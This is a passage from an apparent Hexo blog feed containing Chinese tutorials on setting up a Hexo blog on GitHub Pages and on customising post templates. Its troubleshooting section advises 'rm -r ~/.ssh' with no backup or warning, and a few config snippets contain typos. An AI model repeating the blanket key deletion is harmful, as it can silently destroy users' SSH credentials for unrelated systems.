data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816155627.png" class="lozad"></p><p>输入用户名，邮箱和账号密码后点击注册，进入第二步</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816155949.png" class="lozad"></p><p>选择免费个人版</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816160249.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816160355.png" class="lozad"></p><p>去刚刚注册的邮箱验证一下即可</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816160431.png" class="lozad"></p><h2 id="1-4-购买域名"><a href="#1-4-购买域名" class="headerlink" title="1.4 购买域名"></a>1.4 购买域名</h2><p>购买域名是为了将GitHub的默认域名解析到自己的域名下，这样以后就可以直接访问自己的域名了，不需要在输入GitHub的默认域名了。</p><p><a href="https://dnspod.cloud.tencent.com/" target="_blank" rel="noopener">腾讯注册域名传送门</a>  <a href="https://wanwang.aliyun.com" target="_blank" rel="noopener">阿里云注册域名传送门</a></p><h1 id="0x02-搭建hexo博客"><a href="#0x02-搭建hexo博客" class="headerlink" title="0x02 搭建hexo博客"></a>0x02 搭建hexo博客</h1><h2 id="2-1-配置GitHub"><a href="#2-1-配置GitHub" class="headerlink" title="2.1 配置GitHub"></a>2.1 配置GitHub</h2><p>首先需要创建一个新的repository仓库，</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816162045.png" class="lozad"></p><p>​    <img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816162135.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816162258.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816162500.png" class="lozad"></p><p>一直往下拉，找到GitHub pages</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816162646.png" class="lozad"></p><p>访问链接效果如下：</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816163028.png" class="lozad"></p><p>将Hexo与Github page联系起来，设置Git的user name和email（如果是第一次的话）</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816163105.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816163122.png" class="lozad"></p><p>分别输入：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --<span class="keyword">global</span> user.name <span class="string">"madcoding"</span></span><br><span class="line">git config --<span class="keyword">global</span> user.email <span class="string">"madcoding@163.com"</span></span><br></pre></td></tr></table></figure><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816163217.png" class="lozad"></p><p><strong>注：这里“madcoding”可以替换成自己的用户名，邮箱可以替换成自己的邮箱</strong></p><p>输入<code>ssh-keygen -t rsa -C “madcoding163.com”</code>连续三个回车，生成密钥，最后得到了两个文件：<code>id_rsa</code>和<code>id_rsa.pub</code>（默认存储路径是：C:\Users\Administrator.ssh）。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816163333.png" class="lozad"></p><p>输入<code>eval &quot;$(ssh-agent -s)&quot;</code>，添加密钥到<code>ssh-agent</code></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816163601.png" class="lozad"></p><p> 再输入ssh-add ~/.ssh/id_rsa，添加生成的SSH key到ssh-agent</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816163652.png" class="lozad"></p><p>在目录C:\Users\Administrator.ssh下载，找到下面两文件</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816163711.png" class="lozad"></p><p>用记事本打开id_rsa.pub，复制里面的内容</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816163730.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816163742.png" class="lozad"></p><p>添加成功</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816163759.png" class="lozad"></p><p>继续在Git bash中输入ssh -T <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a> 然后输入两次yes，返回下图说明连接成功</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816163840.png" class="lozad"></p><h2 id="2-2-自定义域名设置"><a href="#2-2-自定义域名设置" class="headerlink" title="2.2 自定义域名设置"></a>2.2 自定义域名设置</h2><p>在Blog的source目录下，新建一个CANME文件，具体操作如下</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816164007.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816164044.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816164727.png" class="lozad"></p><p>在cmd窗口中输入ping 用户名.github.io 得到GitHub分配的一个公网ip地址，记下这个地址</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816164454.png" class="lozad"></p><p>##2.3 设置域名解析</p><p>然后到阿里云购买好的域名中心，设置域名解析，下面是设置好的结果</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816164642.png" class="lozad"></p><p>设置步骤：</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816164925.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816164942.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816165010.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816165027.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816165046.png" class="lozad"></p><p>##2.4 配置部署</p><p>在Blog的根目录下，找到_config.yml文件，修改repo值（在末尾）</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816165607.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816165450.png" class="lozad"></p><p>在Git bash中输入hexo new post “test”</p><p>这时，可以在source文件下的_posts文件夹中看到刚刚新建的test文件，写文章可以直接在该文档中去写</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816165733.png" class="lozad"></p><p>在生成以及部署文章之前，需要安装一个扩展：</p><blockquote><p>npm install hexo-deployer-git –save</p></blockquote><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816165849.png" class="lozad"></p><p>使用编辑器编好文章，那么就可以使用命令：hexo g 来生成静态的文档</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816165925.png" class="lozad"></p><p>然后使用hexo d 来部署到GitHub中</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816165951.png" class="lozad"></p><p>如果点击login后dos界面没有反应，按一下enter键就好了</p><p>出现下图，部署成功</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816170119.png" class="lozad"></p><h1 id="0x03-美化博客"><a href="#0x03-美化博客" class="headerlink" title="0x03 美化博客"></a>0x03 美化博客</h1><h2 id="3-1-跟换主题"><a href="#3-1-跟换主题" class="headerlink" title="3.1 跟换主题"></a>3.1 跟换主题</h2><p>1.可以直接去hexo官方主题库中去找一个自己喜欢的主题去下载，然后下载完成后复制到themes文件夹下。<a href="https://hexo.io/themes/" target="_blank" rel="noopener">传送门</a></p><p>2.在Blog目录下，右击，点击Git bash here，然后输入</p><p>git clone <a href="https://github.com/shenliyang/hexo-theme-snippet.git" target="_blank" rel="noopener">https://github.com/shenliyang/hexo-theme-snippet.git</a> </p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816173519.png" class="lozad"></p><h2 id="3-2-博客导航栏设置"><a href="#3-2-博客导航栏设置" class="headerlink" title="3.2 博客导航栏设置"></a>3.2 博客导航栏设置</h2><p>直接在博客主题目录下设置即可，在zh-CN中设置也可以。</p><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63rxz6chbj20dz06y74j.jpg" class="lozad"></p><p>​    效果显示</p><p><img alt data-src="G:%5CBlog%5Csource_posts%5C78bb2039ly1g63rz389x9j20v2027q5y.jpg" class="lozad"></p><h2 id="3-3-分类设置"><a href="#3-3-分类设置" class="headerlink" title="3.3 分类设置"></a>3.3 分类设置</h2><p>虽然我们在主题中设置了导航栏，但是却没有给导航栏设置对应的页面，所以点击的时候是不能正常显示的。</p><h3 id="3-3-1-添加分类列表"><a href="#3-3-1-添加分类列表" class="headerlink" title="3.3.1 添加分类列表"></a>3.3.1 添加分类列表</h3><p>在项目根目录下，执行下面的命令行，新建分类页面，然后会在项目根目录下的 <strong>source</strong> 文件夹中新建一个 <strong>categories</strong> 文件夹。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page categories</span><br></pre></td></tr></table></figure><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63s2yji4qj20gy0aoq3e.jpg" class="lozad"></p><p>打开 <strong>categories</strong> 文件夹中的 <strong>index.md</strong> 文件，添加 <strong>type</strong> 字段，设置为 <strong>“categories”</strong>。如下图所示。</p><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63s3sxxtuj20bt04g745.jpg" class="lozad"></p><p>接着到主题文件夹下的 _config.yml 配置文件下，找到 <strong>menu</strong> 模块，把 <strong>categories</strong> 的注释给去掉。如下图所示。</p><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63s4q4qq9j20ek06bwep.jpg" class="lozad"></p><p>刷新页面（如果刷新没效果，可以重启服务），可以在页面左侧栏上看到多了一个“分类”列表。</p><h3 id="3-3-2-如何将文章添加到对应分类？"><a href="#3-3-2-如何将文章添加到对应分类？" class="headerlink" title="3.3.2 如何将文章添加到对应分类？"></a>3.3.2 如何将文章添加到对应分类？</h3><p>文章发布前，在 front-matter 部分，多写一个 <strong>categories</strong> 字段，然后参数写上类别的名称，保存后重启服务，在网页上点击“分类”，可以看到分类下已经生成了刚刚设置的类别，并把刚刚发布的文章归类在此类别下。如下图所示。</p><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63s656g6xj20em091glo.jpg" class="lozad"></p><h2 id="3-4-标签设置"><a href="#3-4-标签设置" class="headerlink" title="3.4 标签设置"></a>3.4 标签设置</h2><p>方法跟分类设置原理一样，这里就不在重复介绍了，需要注意一点的是格式问题。</p><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63s81nzjlj20d705cjra.jpg" class="lozad"></p><h2 id="3-5-Hexo-博客添加站内搜索"><a href="#3-5-Hexo-博客添加站内搜索" class="headerlink" title="3.5 Hexo 博客添加站内搜索"></a>3.5 Hexo 博客添加站内搜索</h2><p>蝴蝶主题支持Algolia，Local Search，这就给大家介绍一些Local Search，因为这个配置简单，-&gt; -&gt;。注意：安装的时候要是项目根目录下安装。</p><p>安装 hexo-generator-search</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-generator-search --save</span><br></pre></td></tr></table></figure><p>安装 hexo-generator-searchdb</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-generator-searchdb --save</span><br></pre></td></tr></table></figure><p>在项目根目录下的 _config.yml 配置文件的文末添加下面这段代码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  field: post</span><br><span class="line">  format: html</span><br><span class="line">  limit: 10000</span><br></pre></td></tr></table></figure><p>编辑主题文件夹的 _config.yml 配置文件，设置 Local searchenable 为 <strong>ture</strong>。</p><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63siez3j3j20la068mxd.jpg" class="lozad"></p><p>效果图</p><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63sixkh8fj20l20c9wi4.jpg" class="lozad"></p><h1 id="0x04-其他功能"><a href="#0x04-其他功能" class="headerlink" title="0x04 其他功能"></a>0x04 其他功能</h1><h1 id="0x05-采坑指南"><a href="#0x05-采坑指南" class="headerlink" title="0x05 采坑指南"></a>0x05 采坑指南</h1><h2 id="5-1-端口占用问题"><a href="#5-1-端口占用问题" class="headerlink" title="5.1 端口占用问题"></a>5.1 端口占用问题</h2><p>假如页面一直无法跳转，那么可能端口被占用了。此时我们<code>ctrl+c</code>停止服务器，接着输入<code>“hexo server -p 端口号”</code>来改变端口号</p><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63sltc3yfj20g0045mx1.jpg" class="lozad"></p><h2 id="5-2-npm-install-hexo-g出现问题"><a href="#5-2-npm-install-hexo-g出现问题" class="headerlink" title="5.2 npm install hexo -g出现问题"></a>5.2 npm install hexo -g出现问题</h2><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63sm9gnpfj20k004mt8u.jpg" class="lozad"></p><p>解决方法：</p><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63smjyd3bj20iq03oq31.jpg" class="lozad"></p><p>然后再次执行<code>npm install hexo  -g</code></p><h2 id="5-3-ssh-key配置失败"><a href="#5-3-ssh-key配置失败" class="headerlink" title="5.3 ssh-key配置失败"></a>5.3 ssh-key配置失败</h2><p>首先，清除所有的<code>key-pair</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh-add -D</span><br><span class="line">rm -r ~/.ssh</span><br></pre></td></tr></table></figure><p>删除你在<code>github</code>中的<code>public-key</code>,重新生成<code>ssh</code>密钥对</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;xxx@xxx.com&quot;</span><br></pre></td></tr></table></figure><p>接下来正常操作</p><p>在<code>github</code>上添加公钥<code>public-key</code>:</p><p>1、首先在你的终端运行<code>xclip -sel c ~/.ssh/id_rsa.pub</code>将公钥内容复制到剪切板</p><p>2、在<code>github</code>上添加公钥时，直接复制即可</p><p>3、保存</p><p>删除你在<code>github</code>中的<code>public-key</code></p><p>重新生成<code>ssh</code>密钥对</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;xxx@xxx.com&quot;</span><br></pre></td></tr></table></figure><p>测试：</p><p>在终端 <code>ssh -T git@github.com</code></p><h2 id="5-4-发布文章时出现问题"><a href="#5-4-发布文章时出现问题" class="headerlink" title="5.4 发布文章时出现问题"></a>5.4 发布文章时出现问题</h2><p>###5.4.1 问题描述</p><p>使用<code>hexo d -g</code>命令发布文章使，出现如下问题</p><p>YAMLException: can not read a block mapping entry; a multiline key may not be an implicit key at line 4, column 1:</p><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63sqhgmawj20mq0a03yu.jpg" class="lozad"></p><h3 id="5-4-2-问题原因"><a href="#5-4-2-问题原因" class="headerlink" title="5.4.2 问题原因"></a>5.4.2 问题原因</h3><p>在发布文章的<code>md</code>文件里面开头的文件头没有加空格如下：</p><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63sr6vxpbj20ho052t8v.jpg" class="lozad"></p><h3 id="5-4-3-解决方法"><a href="#5-4-3-解决方法" class="headerlink" title="5.4.3 解决方法"></a>5.4.3 解决方法</h3><p>加上空格后，重新编译，没有出错（记得保存）</p><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63srtnqhrj20cl05h74a.jpg" class="lozad"></p><p>重新编译，完成部署</p><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63ss3rwp9j20f1073q2z.jpg" class="lozad"></p><h2 id="5-5-输入hexo-generate或者其他hexo的命令时出现下面的问题"><a href="#5-5-输入hexo-generate或者其他hexo的命令时出现下面的问题" class="headerlink" title="5.5 输入hexo generate或者其他hexo的命令时出现下面的问题"></a>5.5 输入hexo generate或者其他hexo的命令时出现下面的问题</h2><h3 id="5-5-1-问题描述"><a href="#5-5-1-问题描述" class="headerlink" title="5.5.1 问题描述"></a>5.5.1 问题描述</h3><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63ssmzdxej20jy0dlwfq.jpg" class="lozad"></p><h3 id="5-5-2-问题原因"><a href="#5-5-2-问题原因" class="headerlink" title="5.5.2 问题原因"></a>5.5.2 问题原因</h3><p>yml的配置文件中国，冒号后面需要有空格，如下：</p><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63stb003fj20ly03edfu.jpg" class="lozad"></p><h3 id="5-5-3-解决方法"><a href="#5-5-3-解决方法" class="headerlink" title="5.5.3 解决方法"></a>5.5.3 解决方法</h3><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63stxxxr9j20n1034wee.jpg" class="lozad"></p><p>保存后重新运行，没报错，空格真的是大坑。</p><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63sudywlzj20cw02pjr8.jpg" class="lozad"></p><h2 id="5-6-部署博客没有CSS"><a href="#5-6-部署博客没有CSS" class="headerlink" title="5.6 部署博客没有CSS"></a>5.6 部署博客没有CSS</h2><h3 id="5-6-1-问题描述"><a href="#5-6-1-问题描述" class="headerlink" title="5.6.1 问题描述"></a>5.6.1 问题描述</h3><p>在本地server成功，显示没有问题</p><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63szsvf18j20it0aztcu.jpg" class="lozad"></p><p>但是部署到github上之后，就无法显示主题和图片了</p><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63sz41tkij20zi0r6go5.jpg" class="lozad"></p><h3 id="5-6-2-解决方法"><a href="#5-6-2-解决方法" class="headerlink" title="5.6.2 解决方法"></a>5.6.2 解决方法</h3><p>更改一下_config.yml文件，其中的url和root属性。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ur: http://www.nideyuming.com/blog/</span><br><span class="line">root: /blog</span><br></pre></td></tr></table></figure><p>root 下面应该设置成 /你的项目名 而不是/</p><p>然后重新部署一下就成功了。</p><h2 id="5-7-GitHub配置个人域名出现问题"><a href="#5-7-GitHub配置个人域名出现问题" class="headerlink" title="5.7 GitHub配置个人域名出现问题"></a>5.7 GitHub配置个人域名出现问题</h2><h3 id="5-7-1-问题描述"><a href="#5-7-1-问题描述" class="headerlink" title="5.7.1 问题描述"></a>5.7.1 问题描述</h3><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63sy0dtlxj20tr0kvq4a.jpg" class="lozad"></p><h3 id="5-7-2-解决方法"><a href="#5-7-2-解决方法" class="headerlink" title="5.7.2  解决方法"></a>5.7.2  解决方法</h3><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63t0ljwbpj20sz0lk76b.jpg" class="lozad"></p><h2 id="5-8-npm-install安装依赖出现问题"><a href="#5-8-npm-install安装依赖出现问题" class="headerlink" title="5.8 npm install安装依赖出现问题"></a>5.8 npm install安装依赖出现问题</h2><h3 id="5-8-1-问题描述"><a href="#5-8-1-问题描述" class="headerlink" title="5.8.1 问题描述"></a>5.8.1 问题描述</h3><p>npm WARN <a href="mailto:babel-eslint@10.0.1" target="_blank" rel="noopener">babel-eslint@10.0.1</a> requires a peer of eslint@&gt;= 4.12.1 but none is installed. You must install peer dependencies yourself.</p><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63t1gkedpj20k206sjrx.jpg" class="lozad"></p><h3 id="5-8-2-解决方法"><a href="#5-8-2-解决方法" class="headerlink" title="5.8.2 解决方法"></a>5.8.2 解决方法</h3><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63t24qb2hj20mx0cpae4.jpg" class="lozad"></p><p>##5.9 输入自己后买的域名后访问是404</p><h3 id="5-9-1-问题描述"><a href="#5-9-1-问题描述" class="headerlink" title="5.9.1 问题描述"></a>5.9.1 问题描述</h3><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63t30fnfkj20r20dv3yx.jpg" class="lozad"></p><p>但是使用github的默认域名可以正常访问，所以问题出在了域名解析和站点配置的问题上了</p><p>先考虑重置设置一下域名解析的记录，将</p><p>重新设置好了域名解析，但是还是出现404，我TM。。。。</p><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63t3frgu7j20p60ht0t5.jpg" class="lozad"></p><p>行，那就是站点配置上面的错误了，在<code>hexo</code>生成的博客的<code>source</code>目录下新建一个 <code>CNAME</code> 文件，然后在这个文件中填入你的域名，这样就不会每次发布之后，<code>gitpage</code>里的 <code>customdomain</code>都被重置掉啦。</p><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63t3yrcdxj20hx08ht8z.jpg" class="lozad"></p><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63t47u135j20ff03mgle.jpg" class="lozad"></p><p>重新部署后，在<code>GitHub</code>中会出现<code>CNAME</code>，说明设置成功了</p><p><img alt data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63t4g3nx8j211s0453yo.jpg" class="lozad"></p><h1 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h1><p><a href="https://www.cnblogs.com/fengxiongZz/p/7707219.html" target="_blank" rel="noopener">https://www.cnblogs.com/fengxiongZz/p/7707219.html</a></p><p><a href="https://www.simon96.online/2018/10/12/hexo-tutorial/" target="_blank" rel="noopener">https://www.simon96.online/2018/10/12/hexo-tutorial/</a></p><p><a href="https://blog.csdn.net/liuyongshun2/article/details/54629087" target="_blank" rel="noopener">https://blog.csdn.net/liuyongshun2/article/details/54629087</a></p><p><a href="https://jerryc.me/posts/21cfbf15/#快速開始" target="_blank" rel="noopener">https://jerryc.me/posts/21cfbf15/#%E5%BF%AB%E9%80%9F%E9%96%8B%E5%A7%8B</a></p><hr>]]></content>
      
      
      <categories>
          
          <category> hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> github </tag>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>自定义hexo创建文章的模板</title>
      <link href="/2019/08/02/%E8%87%AA%E5%AE%9A%E4%B9%89hexo%E5%88%9B%E5%BB%BA%E6%96%87%E7%AB%A0%E7%9A%84%E6%A8%A1%E6%9D%BF/"/>
      <url>/2019/08/02/%E8%87%AA%E5%AE%9A%E4%B9%89hexo%E5%88%9B%E5%BB%BA%E6%96%87%E7%AB%A0%E7%9A%84%E6%A8%A1%E6%9D%BF/</url>
      
        <content type="html"><![CDATA[<p>#0x00 前言</p><p>在众多的博客中，我选择了<code>hexo</code>，最大的优势就是可以结合<code>GitHub page</code>来搭建一个免费的个人博客系统，将文章都托管到<code>GitHub</code>上，在也不用担心服务器过期的问题了，而且可以自己买一个域名，解析了<code>GitHub</code>上就可以直接使域名访问了。很多小伙伴给自己个博客添加了很多其他的功能，但是每次写文章的时候都需要在文章的开头去写一遍，这简直就是重复造轮子。其实，你可以自己在<code>scaffolds</code>中去修改属于你自己的模板</p><a id="more"></a><p>#0x01 目录了解</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">hexo-install-directory</span><br><span class="line">├── CNAME</span><br><span class="line">├── _config.yml  //Hexo的配置文件，可以配置主题、语言等</span><br><span class="line">├── avatar.jpg</span><br><span class="line">├── db.json</span><br><span class="line">├── debug.log</span><br><span class="line">├── node_modules</span><br><span class="line">├── public     //执行hexo g命令后，生成的内容会在这里，包括所有的文章、页面、分类、tag等.</span><br><span class="line">├── scaffolds    //保存着默认模板，自定义模板就是修改该目录下的文件</span><br><span class="line">│   ├── draft.md //默认的草稿模板</span><br><span class="line">│   ├── page.md  //默认的页面模板</span><br><span class="line">│   └── post.md  //默认的文章模板</span><br><span class="line">├── source  //Hexo存放编辑页面的地方，可以使用vim或其他编辑器编辑这里的内容</span><br><span class="line">│   ├── 404.html //自定义404页面，可以使用腾讯公益404页面</span><br><span class="line">│   ├── Staticfile </span><br><span class="line">│   ├── _drafts  //存放所有的草稿文件的目录</span><br><span class="line">│   ├── _posts //存放所有的文章文件的目录，用的最多，比如执行hexo n "post_name"之后，post_name这篇文章就存放在这个目录下</span><br><span class="line">│   ├── categories</span><br><span class="line">└── themes //Hexo的所有主题</span><br><span class="line">    ├── landscape //原始hexo主题</span><br><span class="line">    ├── next     //这是我目前用的主题</span><br></pre></td></tr></table></figure><h1 id="0x02-修改步骤"><a href="#0x02-修改步骤" class="headerlink" title="0x02 修改步骤"></a>0x02 修改步骤</h1><p>在博客的<code>scaffolds</code>目录下有三个<code>md</code>文档，只需要改<code>post.md</code>即可。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190802145835.png" class="lozad"></p><p>我的模板</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">----</span><br><span class="line">title: &#123;&#123; title &#125;&#125;  //文章标题</span><br><span class="line">date: &#123;&#123; date &#125;&#125;    //文章创建时间</span><br><span class="line">permalink:          //文章显示连接</span><br><span class="line">categories:         //文章匪类目录</span><br><span class="line">tags: []            //文章标签，可多个，用，隔开</span><br><span class="line">description:        //文章描述</span><br><span class="line">image:              //自定义的文章摘要图片，只在页面展示，文章内消失</span><br><span class="line">copyright: true     //增加底部的版权信息（需要配置）</span><br><span class="line">-----</span><br><span class="line">//首页文章展示缩略图</span><br><span class="line">&lt;img src=&quot;https://&quot; alt=&quot;&quot; style=&quot;width:100%&quot; /&gt;  </span><br><span class="line"></span><br><span class="line">0x00 前言</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!-- more --&gt;</span><br><span class="line"></span><br><span class="line">## 0x01 </span><br><span class="line"></span><br><span class="line">## 0x02</span><br><span class="line"></span><br><span class="line">## 0x03</span><br><span class="line"></span><br><span class="line">## 0x04</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;hr /&gt;</span><br><span class="line">版权信息</span><br></pre></td></tr></table></figure><p>模板图片如下:</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190802145338.png" class="lozad"></p><p>#0x03 效果展示</p><p>首页预览</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190802160051.png" class="lozad"></p><p>文章详情</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190802160001.png" class="lozad"></p><p>版权信息</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190802160239.png" class="lozad"></p><p>## </p><hr>]]></content>
      
      
      <categories>
          
          <category> hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> 文章模板 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的大学生活</title>
      <link href="/2019/07/01/%E6%88%91%E7%9A%84%E5%A4%A7%E5%AD%A6%E7%94%9F%E6%B4%BB/"/>
      <url>/2019/07/01/%E6%88%91%E7%9A%84%E5%A4%A7%E5%AD%A6%E7%94%9F%E6%B4%BB/</url>
      
